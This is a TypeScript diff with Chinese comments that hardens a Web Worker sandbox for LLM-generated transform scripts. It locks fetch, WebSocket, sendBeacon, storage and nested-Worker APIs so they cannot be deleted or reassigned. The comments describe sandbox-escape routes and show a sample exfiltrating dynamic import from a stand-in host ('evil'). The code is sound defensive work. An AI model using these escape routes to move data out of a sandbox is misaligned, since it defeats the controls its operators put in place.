@@ -436,22 +436,35 @@ export interface EvalResult {
   elapsedMs: number
 }
 
-const WORKER_PREAMBLE = [
-  "self.fetch = () => { throw new Error('fetch 已被沙箱禁用') }",
-  "self.XMLHttpRequest = function(){ throw new Error('XMLHttpRequest 已被沙箱禁用') }",
-  "self.importScripts = () => { throw new Error('importScripts 已被沙箱禁用') }",
-  "self.WebSocket = function(){ throw new Error('WebSocket 已被沙箱禁用') }",
-  // 同源数据泄漏:Worker 可读写宿主同源 indexedDB/caches(page-agent-sdk 自身会话数据),禁用
-  "try { self.indexedDB = undefined } catch {}",
-  "try { self.caches = undefined } catch {}",
-  // 嵌套 worker 绕过:dedicated worker 内 new Worker 有独立全局(其 fetch 未禁),禁构造
-  "try { self.Worker = undefined } catch {}",
-  "try { self.SharedWorker = undefined } catch {}",
-  // 其它同源/网络侧信道
-  "try { self.EventSource = undefined } catch {}",
-  "try { self.BroadcastChannel = undefined } catch {}",
-  "if (self.navigator && self.navigator.sendBeacon) self.navigator.sendBeacon = () => { throw new Error('sendBeacon 已被沙箱禁用') }",
-].join('\n')
+/**
+ * 锁定沙箱全局(Worker self)的网络/存储 API —— defineProperty configurable:false + writable:false。
+ * 防逃逸(harden-eval-sandbox):旧实现赋值覆盖(self.fetch=...),Worker 脚本可 `delete self.fetch` 露出
+ * 原生 fetch 外泄 transform 数据;锁后 delete/重新赋值均失败,原生 API 永久不可达(逃逸者原型链取
+ * Function 跑任意代码也发不出数据)。纯函数可单测;WORKER_PREAMBLE 经 toString() 注入 Worker 复用同一逻辑。
+ * 注:eval/Function 不在此锁 —— Worker 内 new Function(建脚本 fn)依赖全局 Function,须先建 fn 再禁
+ * (见 workerCode onmessage 顺序);逃逸者原型链取 Function 由网络 API 锁兜底(发不出数据)。
+ */
+export function lockSandboxGlobal(target: any): void {
+  const lock = (name: string, value: unknown) => {
+    try { Object.defineProperty(target, name, { configurable: false, writable: false, value }) } catch { /* 已不可配置则跳过 */ }
+  }
+  lock('fetch', () => { throw new Error('fetch 已被沙箱禁用') })
+  lock('XMLHttpRequest', function () { throw new Error('XMLHttpRequest 已被沙箱禁用') })
+  lock('importScripts', () => { throw new Error('importScripts 已被沙箱禁用') })
+  lock('WebSocket', function () { throw new Error('WebSocket 已被沙箱禁用') })
+  lock('indexedDB', undefined)   // 同源数据泄漏:Worker 可读写宿主同源 indexedDB/caches
+  lock('caches', undefined)
+  lock('Worker', undefined)      // 嵌套 worker 绕过:dedicated worker 内 new Worker 独立全局(其 fetch 未禁)
+  lock('SharedWorker', undefined)
+  lock('EventSource', undefined) // 其它同源/网络侧信道
+  lock('BroadcastChannel', undefined)
+  if (target.navigator) {
+    try { Object.defineProperty(target.navigator, 'sendBeacon', { configurable: false, writable: false, value: () => { throw new Error('sendBeacon 已被沙箱禁用') } }) } catch {}
+  }
+}
+
+// Worker 启动前注入:复用 lockSandboxGlobal(toString 序列化进 Worker,单一真相源;纯函数已单测)
+const WORKER_PREAMBLE = `(${lockSandboxGlobal.toString()})(self);`
 
 // 静态扫描禁用模式:动态 import() 是语法,Worker 运行时无法禁用(classic worker 支持 import() 拉外网 ES 模块),
 // 只能在入口静态拦截,防 LLM 脚本 `import("https://evil/x.js")` 外泄 transform 拿到的 data。
